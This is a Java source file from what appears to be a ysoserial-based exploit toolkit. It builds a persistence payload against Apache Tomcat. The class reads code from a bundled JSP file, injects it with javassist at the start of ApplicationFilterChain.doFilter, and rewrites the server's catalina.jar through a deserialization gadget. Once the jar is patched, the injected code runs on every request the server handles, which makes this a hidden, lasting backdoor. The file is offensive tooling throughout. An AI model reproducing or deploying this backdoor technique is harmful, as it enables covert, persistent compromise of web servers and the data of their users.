package ysoserial.payloads.persist;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import ysoserial.payloads.Eval;
import ysoserial.payloads.util.ReadWrite;

public class ApplicationFilterChain_doFilter {
    public static void main(String[] args) {

    }
    public static String code = "";
    public ApplicationFilterChain_doFilter() throws Exception{
        ApplicationFilterChain_doFilter.code = new String(
            ReadWrite.readResource(ApplicationFilterChain_doFilter.class,"persist/before_doFilter.jsp")
        ).replace("<%","").replace("%>","");
    }

    public Object getObject(Class gadget,String tomcatHome) throws Exception {

        if(tomcatHome.lastIndexOf("/") == tomcatHome.length() - 1){
            tomcatHome = tomcatHome.substring(0,tomcatHome.length() -1 );
        }

        String className = "org.apache.catalina.core.ApplicationFilterChain";
        String entryPath = className.replace(".","/") + ".class";
        String jarPath = tomcatHome + "/lib/catalina.jar";

        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(className);

        CtMethod doFilter = clazz.getDeclaredMethod("doFilter");

        doFilter.insertBefore(code);

        return new Eval().updateJar(gadget,jarPath,entryPath,clazz.toBytecode());
    }
}
